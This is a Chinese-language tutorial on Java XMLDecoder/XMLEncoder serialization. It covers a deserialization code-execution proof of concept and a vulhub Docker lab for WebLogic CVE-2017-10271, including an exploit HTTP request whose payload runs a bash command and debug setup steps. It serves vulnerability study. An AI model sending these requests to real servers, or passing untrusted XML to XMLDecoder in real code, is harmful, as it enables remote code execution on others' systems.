# XMLDecoder/XMLEncoder
`XMLDecoder/XMLEncoder`是在JDK1.4版中添加的`XML`格式序列化持久性方案，可以比较使用Json格式序列化的`FastJson`库。
使用`XMLEncoder`来生成表示`JavaBeans`组件（bean）的`XML`文档，用`XMLDecoder`读取使用 `XMLEncoder`
创建的XML文档获取`JavaBeans`。
## XMLEncoder示例
代码：
    package XMLDecoder;
    import javax.swing.*;
    import java.beans.XMLEncoder;
    import java.io.BufferedOutputStream;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    public class Test {
        public static void main(String[] args) throws FileNotFoundException {
            XMLEncoder e = new XMLEncoder(
                    new BufferedOutputStream(
                            new FileOutputStream("Test.xml")));
            e.writeObject(new JButton("Hello, world"));
            e.close();
        }
    }
`XMLEncoder`类是`ObjectOutputStream`的补充，序列化`JButton`类，生成的序列化`XML`文件如下：
      Hello, world
## XMLDecoder示例
代码：
    package XMLDecoder;
    import javax.swing.*;
    import java.beans.XMLDecoder;
    import java.beans.XMLEncoder;
    import java.io.*;
    public class Test {
        public static void main(String[] args) throws FileNotFoundException {
            XMLDecoder d = new XMLDecoder(
                    new BufferedInputStream(
                            new FileInputStream("Test.xml")));
            Object result = d.readObject();
            System.out.println(result);
            d.close();
        }
    }
使用`XMLDecoder`读取序列化的`XML`文档，获取`JButton`类并打印输出：
    javax.swing.JButton
    [,0,0,0x0,invalid,alignmentX=0.0,alignmentY=0.5,border=com.apple.laf.AquaButtonBorder$Dynamic@179d3b25,flags=288,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=0,left=2,bottom=0,right=2],paintBorder=true,paintFocus=true,pressedIcon=,rolloverEnabled=false,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Hello, world,defaultCapable=true]
## XML文档-对象和元素
`XMLEncoder`生成的`XML`序列化文档表示对象，文档中的每个元素都用来描述如何调用对象的方法。
### string标签
`Hello, World`字符串表示的方式为`Hello, World`
### object标签
通过``标签表示对象，`class`属性指定具体类（用于调用其内部方法），`method`属性指定具体方法名称（比如构造函数的的方法名为`new`）
`new JButton("Hello, world")`对应的XML文档：
      Hello, world
### void标签
通过`void`标签表示函数调用、赋值等操作，`method`属性指定具体的方法名称。
`JButton b = new JButton();b.setText("Hello, world");`对应的XML文档：
        Hello, world
### array标签
通过`array`标签表示数组，`class`属性指定具体类，内部`void`标签的`index`属性表示根据指定数组索引赋值。
`String[] s = new String[3];s[1] = "Hello, world";`对应的XML文档：
        Hello, world
## XMLEncoder反序列化漏洞
通过`XMLEncoder`反序列化XML文档时可以执行类方法，若XML文档可控且构造恶意内容，就可以完成任意代码执行。
反序列化代码：
    package XMLDecoder;
    import java.beans.XMLDecoder;
    import java.io.BufferedInputStream;
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    import java.lang.ProcessBuilder;
    public class xmlDecodeTest {
        public static void main(String[] args) throws FileNotFoundException {
            String path = "src/main/java/XMLDecoder/poc.xml";
            File file = new File(path);
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            XMLDecoder a = new XMLDecoder(bis);
            a.readObject();
        }
    }
恶意XML：
                    /bin/bash
                    -c
                    open /System/Applications/Calculator.app/
使用`java.lang.ProcessBuilder`进行代码执行，整个恶意`XML`反序列化后相当于执行代码：
    String[] cmd = new String[3];
    cmd[0] = "/bin/bash";
    cmd[1] = "-c";
    cmd[2] = "open /System/Applications/Calculator.app/";
    new ProcessBuilder(cmd).start();
# Weblogic Docker调试环境搭建
## 环境搭建
Weblogic的版本为`10.3.6.0`，使用P总`vulhub`中现成的CVE-2017-10271环境：
    https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
修改`docker-compose.yml`文件，添加远程调试端口`8453`映射：
    version: '2'
    services:
     weblogic:
       image: vulhub/weblogic
       ports:
        - "7001:7001"
        - "8453:8453"
`docker-compose up -d`启动容器环境，Weblogic运行在`127.0.0.1:7001`。
CVE-2017-10271攻击数据包：
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 127.0.0.1:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 633
                                /bin/bash
                                -c
                                touch /tmp/rai4over
发送数据包后`docker exec -it f3a bash`进入容器，查看`/tmp/`目录文件创建则环境无误。
## 远程调试
进入容器，配置Weblogic开启远程调试：
    vim /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh
添加配置代码：
    debugFlag="true"
    export debugFlag
然后`docker-compose restart`重启容器。
从`docker`中拷贝Weblogic源码和JDK
`docker cp 62bd5880df6d:/root ./weblogic_jars`
  * Oracle，Weblogic目录，包含调试时需要用的`jar`、`war`包等。
  * JDK，JDK目录，版本为`1.6.0_45`，调试JDK也选择该目录。
在`Middleware`目录下提取全部的`jar`、`war`包到`test`目录。